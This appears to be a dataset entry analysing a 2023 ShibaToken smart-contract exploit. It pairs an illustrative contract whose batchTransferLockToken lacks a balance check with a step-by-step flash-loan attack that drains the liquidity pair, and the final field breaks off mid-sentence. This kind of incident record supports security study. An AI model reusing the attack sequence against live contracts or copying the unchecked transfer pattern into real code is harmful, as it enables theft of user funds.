@@ -1,0 +1,36 @@
+{
+ "id": "2023__2023-11-27_ShibaToken_AccessControl",
+ "source_file": "2023/2023-11-27_ShibaToken_AccessControl.md",
+ "title": "ShibaToken batchTransferLockToken Access Control Vulnerability Incident Analysis",
+ "date": "2023-11-27",
+ "protocol": "ShibaToken",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// File: ShibaToken_decompiled.sol\n    function batchTransferLockToken((address param0, uint256)[] param1) external {}  // ❌"
+ ],
+ "code_after": [],
+ "steps": [
+  "1 ▶ DPPOracle.flashLoan(20 BNB)",
+  "2 ▶ WBNB.withdraw(20 BNB)",
+  "Convert WBNB → BNB",
+  "3 ▶ SHIBAToken.buyByBnb{value: 20 BNB}(address(0))",
+  "4 ▶ SHIBAToken.batchTransferLockToken([",
+  "No amount validation → entire pair balance transferred",
+  "5 ▶ pairAddress.swap(0, 30948..., address(this), \"\")",
+  "6 ▶ PancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(",
+  "SHIBA → BNB)",
+  "7 ▶ WBNB.transfer(DPPOracle, 20 BNB)"
+ ],
+ "other_code": [
+  "// Vulnerable pattern: no amount validation in batchTransferLockToken\ncontract SHIBAToken {\n    struct Airdrop {\n        address recipient;\n        uint256 amount;\n    }\n\n    // Vulnerable: allows transfer amounts exceeding the caller's balance\n    function batchTransferLockToken(Airdrop[] memory airdrops) external {\n        for (uint i = 0; i < airdrops.length; i++) {\n            // require(balanceOf(msg.sender) >= airdrops[i].amount) missing\n            // allows direct transfer from the pair contract\n            _transfer(address(pairAddress), airdrops[i].recipient, airdrops[i].amount);\n        }\n    }\n}",
+  "Attacker [0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189]\n  │\n  ├─1─▶ DPPOracle.flashLoan(20 BNB)\n  │      Borrow BNB via DODO DPP flash loan\n  │      Triggers DPPFlashLoanCall callback\n  │\n  ├─2─▶ WBNB.withdraw(20 BNB)\n  │      Convert WBNB → BNB\n  │\n  ├─3─▶ SHIBAToken.buyByBnb{value: 20 BNB}(address(0))\n  │      [SHIBA: 0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5]\n  │      Purchase small amount of SHIBA via ICO\n  │\n  ├─4─▶ SHIBAToken.batchTransferLockToken([\n  │          Airdrop(address(pairAddress), 507,677,278,570... SHIBA)\n  │      ])\n  │      Drain large amount of SHIBA directly from the pair\n  │      No amount validation → entire pair balance transferred\n  │\n  ├─5─▶ pairAddress.swap(0, 30948..., address(this), \"\")\n  │      [SHIBA/WBNB Pair: xa19d...]\n  │      Extract additional WBNB from"
+ ]
+}
